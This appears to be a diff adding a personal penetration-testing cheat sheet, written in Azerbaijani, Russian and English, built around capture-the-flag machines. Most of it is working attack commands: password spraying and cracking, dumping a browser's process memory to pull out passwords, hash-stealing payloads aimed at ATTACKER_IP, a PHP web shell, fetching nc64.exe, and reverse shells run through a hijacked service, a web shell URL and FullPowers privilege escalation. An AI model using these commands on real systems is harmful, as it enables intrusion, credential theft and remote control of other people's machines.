@@ -1,0 +1,127 @@
+feroxbuster= directoryler =>windows =/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+linux =/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+
+
+
+dnssum --dnsserver IP -f directory domen (-o ZZZZ.xml fayl)
+
+		subdomains-top1million-110000.txt — оптимальный выбор по соотношению скорости и полноты:
+			/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+		bitquark-subdomains-top100000.txt — содержит популярные поддомены на основе анализа публичных источников:
+			/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+
+
+	
+exiftool -Creator *.pdf = создатель файла
+
+sudo apt install python3-venv -y    ====>python3 -m venv .venv ====>source .venv/bin/activate
+
+evil-winrm -i <IP-адрес> -u <пользователь> -p <пароль>
+
+kerbrute userenum -d <имя_домена> --dc <ip_адрес_контроллера_домена> <путь_к_файлу_с_именами>
+
+kerbrute password-spray -d intelligence.htb --dc 10.10.10.248 users.txt Newuser2020M спрейим пароль
+
+nxc smb 10.10.10.248 -u 'Tiffany.Molina' -p 'Newuser2020M' --shares (смотрим пользователя и еще сетевые папки
+
+
+smbclient //10.10.10.248/IT -U 'intelligence.htb\Tiffany.Molina%Newuser2020M' 		Newuser2020M=paroldu
+
+
+smbmap -H <IP> -u <пользователь> -p <пароль> -d <домен>
+
+
+cmdkey /list => runas /savecred /user:CTF\Administrator "cmd.exe"
+
+
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt=ntlmv2
+
+
+python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'Newuser2020M' -a add -r web-exploit.intelligence.htb -d 10.10.14.X 10.10.10.248 => хост создаем
+
+
+bloodhound-python -u 'Ted.Graves' -p 'ПарольТеда' -d intelligence.htb -dc dc.intelligence.htb -c All
+
+
+ldapsearch -H ldap://10.10.10.248 -x -D "Ted.Graves@intelligence.htb" -w 'Пароль_Теда' -b "DC=intelligence,DC=htb"
+
+
+sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
+
+sc.exe start VSS
+
+
+netexec smb -L | grep pass
+
+netexec smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=Test123.
+
+
+
+swaks --to career@job.local --from test@test.com --server 10.129.234.73 --attach file	отправить письмо
+
+
+nxc smb 10.10.10.149 -u 'login' -p 'password' --rid-brute =RID bruteforce
+
+
+		# Команда загрузки внутри Evil-WinRM(evil winrm fayl yuklemek )
+				bash:
+				upload /path/to/procdump.exe C:\Users\Chase\AppData\Local\Temp\procdump.exe
+
+				powershell
+				# Поиск PID процессов
+					Get-Process firefox
+
+				# Дамп памяти конкретного процесса (по PID)
+					.\procdump.exe -ma <PID> file.dmp
+
+				#oxumaq fayli
+					strings file.dmp | grep -i "pass"
+
+
+
+payload hash goturmek ucun sayta yuklemek payload :
+
+			https://<ATTACKER_IP>/test
+			file://\\<ATTACKER_IP>\steal\file
+
+
+
+where /R C:\ index.php
+
+
+
+PORTAL:
+
+	rmdir /s /q "C:\\Windows\\Tasks\\Uploads\\3b060c7f54f15b7268440128b7f34e6e"
+
+
+
+
+
+		<?php system($['cmd']); ?> php yukleyirik
+
+
+		mklink /J C:\Windows\Tasks\Uploads\3b060c7f54f15b7268440128b7f34e6e C:\xampp\htdocs==> serverin koku
+
+	
+		fayl oturmek :
+
+			cd /usr/share/windows-resources/binaries/		nc.exe
+	
+			python3 -m http.server 80
+	
+			/usr/share/windows-resources/binaries/nc.exe
+	
+			powershellde : iwr http://<НАШ_IP>/nc64.exe -outfile C:\temp\nc64.exe
+	
+
+
+		nc -nlvp 443
+
+	
+		http://media.vl/shell.php?cmd=C:\temp\nc64.exe+-e+cmd.exe+<ATTACKER_IP>+443
+
+
+		FullPowers.exe -c "C:\temp\nc64.exe <ATTACKER_IP> 443 -e cmd" -z => daha privileged shell almaq ucun
